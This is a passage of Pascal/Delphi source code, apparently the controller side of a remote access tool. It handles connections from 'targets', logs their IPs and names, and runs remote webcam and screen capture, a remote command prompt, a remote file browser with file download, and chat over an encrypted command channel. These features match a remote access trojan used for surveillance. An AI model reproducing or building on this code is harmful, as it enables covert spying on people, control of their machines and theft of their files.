 if (AContext = SCon) or (AContext = WebContext) then Begin
  //Screenshare and Webcam
  Jay:=TJPEGImage.Create;
  S:=TMemoryStream.Create;
  S.Position:=0;
  try
    AContext.Connection.IOHandler.LargeStream:=True;
    AContext.Connection.IOHandler.ReadStream(S);
    S.Position:=0;
    Jay.LoadFromStream(S);
    try
    if AContext = WebContext then
    WebcamForm.CamImage.Picture.Assign(Jay) else
    ScreenForm.Scr.Picture.Assign(Jay);
    except
    end;
  finally
    S.Free;
    Jay.Free;
  end;
 End else Begin

 Com:=AContext.Connection.IOHandler.ReadLn();
 INum:=StrToInt(LeftStr(Com,Pos('@',Com)-1));
 Delete(Com,1,Pos('@', Com));
 Com:=DecryptStr(Com, TheKey);

 Case INum of
  0: Begin
   //Main Context (Login)
   SetLength(Clients, High(Clients) + 2);
   H:=High(Clients);
   Clients[H].MainContext:=AContext;
   Clients[H].IP:=AContext.Binding.PeerIP;
   Clients[H].Name:=Com;
   Clients[H].Online:=True;
   Log('Main context connected: '+Clients[H].IP);
   Log('Name: '+Clients[H].Name);
   J:=-1;
   For P:=1 to ClientGrid.RowCount-1 do Begin
    if (ClientGrid.Cells[0, P]=Clients[H].Name) and (ClientGrid.Cells[1, P]=Clients[H].IP) then Begin
     J:=P;
     Break;
    end;
   end;
   if J=-1 then AddEntry(Clients[H].Name, Clients[H].IP,'Unknown','0.003','Online')
   else ClientGrid.Cells[4, J]:='Online';
   DB.WriteString(Clients[H].Name,'IP',Clients[H].IP);
   DB.WriteString(Clients[H].Name,'Location','Unknown');
   DB.WriteString(Clients[H].Name,'Version','0.003');
  end;

  777: Begin
   //Remote Command Prompt (Response)
   RemoteCMDForm.Console.Lines.Text:=RemoteCMDForm.Console.Lines.Text+LeftStr(Com, Length(Com) - 1);
   RemoteCMDForm.CommandEDT.Enabled:=True;
   RemoteCMDForm.CommandEDT.SetFocus;
  End;
  776: Begin
   //Universal "Single Task Terminated" Command
   SingleTaskActive:=False;
   SetTaskButtons(True);
   SCon:=Nil;
   CCon:=Nil;
   WebContext:=Nil;
   MainC:=Nil;
  End;
  7: Begin
   //Remote Command Prompt (Connect)
   RemoteCMDUnit.TheContext:=AContext;
   SingleTaskActive:=True;
   SetTaskButtons(False);
   RemoteCMDForm.CommandEDT.Enabled:=True;
  end;

  223: Begin
   //Remote File Explorer (New Drive/Directory)
   if Pos('#Last',Com)=Length(Com)-Length('#Last')+1 then Begin
    FileForm.DirView.Items.Add(LeftStr(Com, Pos('#Last',Com) - 1));
    FileForm.UpdateBookmarks;
   End else
   FileForm.DirView.Items.Add(Com);
   Inc(DriveCount);
  End;
  224: Begin
   //Remote File Explorer (New File/Directory)
   J:=FileForm.FileListView.RowCount+1;
   FileForm.FileListView.RowCount:=J;
   FileForm.FileListView.Cells[0, J-1]:=LeftStr(Com, Pos('*',Com) - 1);
   Delete(Com, 1, Pos('*', Com));
   FileForm.FileListView.Cells[1, J-1]:=LeftStr(Com, Pos('*',Com) - 1);
   Delete(Com, 1, Pos('*', Com));
   FileForm.FileListView.Cells[2, J-1]:=LeftStr(Com, Pos('*',Com) - 1);
  End;
  225: Begin
   //Remote File Manager (Status change: Disabled)
   FileForm.FileListView.RowCount:=1;
   FileForm.FileListView.Options:=FileForm.FileListView.Options-[goRowSelect];
  End;
  226: Begin
   //Remote File Manager (Navigate)
   SendEncrypt(TheContext,224,CurrentDir,False);
   FileForm.LowStatusBar.Panels[0].Text:=Com;
  End;
  235: Begin
   //???
  End;
  236: Begin
   //Remote File Manager (Download file)
   //THIS FUNCTION SHOULD BE UPDATED (Streams)!
   //THIS IS A HORRIBLE WAY OF DOWNLOADING DATA!
   if Com<>'OVER' then Huge+=Com
   else Begin
   AssignFile(FFile,DownlTo);
   Rewrite(FFile);
   Write(FFile, DecodeStringBase64(Huge));
   CloseFile(FFile);
   FileForm.FileListView.Enabled:=True;
   FileForm.DirView.Enabled:=True;
   FileForm.LowStatusBar.Panels[0].Text:='Download successful.';
   Huge:='';
   End;
  End;

  250: Begin
   //Remote Log
   FileForm.LowStatusBar.Panels[0].Text:=Com;
   if Pos('doesn''t exist',Com)>0 then Begin
     DownlTo:='';
     FileForm.FileListView.Enabled:=True;
     FileForm.DirView.Enabled:=True;
   End;
  End;

  2: Begin
   //Remote File Manager (Connect)
   RemoteFileUnit.TheContext:=AContext;
   SingleTaskActive:=True;
   SetTaskButtons(False);
   FileForm.FileListView.Enabled:=True;
   FileForm.DirView.Enabled:=True;
   SendEmptyCommand(AContext, 223);
  End;

  3: Begin
   //Screenshare (Image - Connect)
   SCon:=AContext;
   //SCon.Connection.IOHandler.LargeStream:=True;
  end;

  4: Begin
   //Webcam (Connect)
   WebContext:=AContext;
  End;

  300: Begin
   //Screenshare (Commands - Connect)
   CCon:=AContext;
  end;
  555: Begin
   //Chat (Connect)
   ChatUnit.ChatContext:=AContext;
  End;
  501: Begin
   //Chat (New Message)
   ChatForm.ChatLog.Lines.Add(LeftStr(Com, Length(Com) - 1));
  end
  else Begin
   //Handle standard functions
   if (High(Targets)=1) and (Targets[1].MainContext=AContext) and (Pos('Script: ',Com)<>1)
   then ShowMessage(Com) else
   Log(AContext.Binding.PeerIP+' says: '+IntToStr(INum)+'@'+Com);
  end;
 end;
end;
end;

procedure TVoidForm.WebcamButtonClick(Sender: TObject);
begin
  SingleTaskActive:=True;
  SetTaskButtons(False);
  WebcamForm.Show;
  SendEmptyCommand(Targets[1].MainContext, 444);
  MainC:=Targets[1].MainContext;
end;

end.

